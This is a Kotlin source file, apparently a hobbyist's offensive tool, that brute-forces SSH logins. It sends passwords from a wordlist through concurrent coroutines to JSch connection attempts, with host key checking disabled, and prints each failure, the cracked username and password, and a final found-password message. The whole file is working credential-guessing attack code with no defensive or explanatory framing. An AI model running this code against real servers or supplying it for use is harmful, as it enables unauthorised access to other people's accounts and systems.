/*
 * Coded by KilluaDev.kt
 */

package killua.dev

import com.jcraft.jsch.JSch
import com.jcraft.jsch.JSchException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.channels.SendChannel
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.joinAll
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicInteger

suspend fun Config.sendPasswords(
    wordlist: List<String>,
    taskChannel: SendChannel<String>
) = coroutineScope {
    val processedPasswords = mutableSetOf<String>()
    wordlist.forEach { word ->
        if (!processedPasswords.contains(word)) {
            taskChannel.send(word)
            processedPasswords.add(word)
        }
    }
    taskChannel.close()
}
fun trySSHConnection(
    config: Config,
    password: String
): Boolean {
    return try {
        JSch().getSession(config.username, config.host, config.port).apply {
            setPassword(password)
            setConfig("StrictHostKeyChecking", "no")
            timeout = config.timeout * 1000
            connect()
            openChannel("session").also { it.connect() }
            disconnect()
        }
        true
    } catch (_: JSchException) {
        false
    }
}

suspend fun Config.bruteforce(wordlist: List<String>)= coroutineScope {
    val taskChannel = Channel<String>()
    val foundPassword = Channel<String>()
    val completedTasks = AtomicInteger(0)
    launch { sendPasswords(wordlist, taskChannel) }
    val job = launch {
        List(thread) {
            launch(Dispatchers.IO) {
                for (password in taskChannel) {
                    try {
                        if (trySSHConnection(this@bruteforce, password)) {
                            println("[+] 成功: $username:$password")
                            foundPassword.send(password)
                            return@launch
                        } else {
                            println("[-] 失败: $username:$password")
                        }
                    } finally {
                        completedTasks.incrementAndGet()
                    }
                }
            }
        }.joinAll()
        foundPassword.close()
    }
    val result = foundPassword.receiveCatching()
    if(result.isSuccess) {
        println("[*] 找到密码: ${result.getOrNull()}")
        job.cancel()
    }
}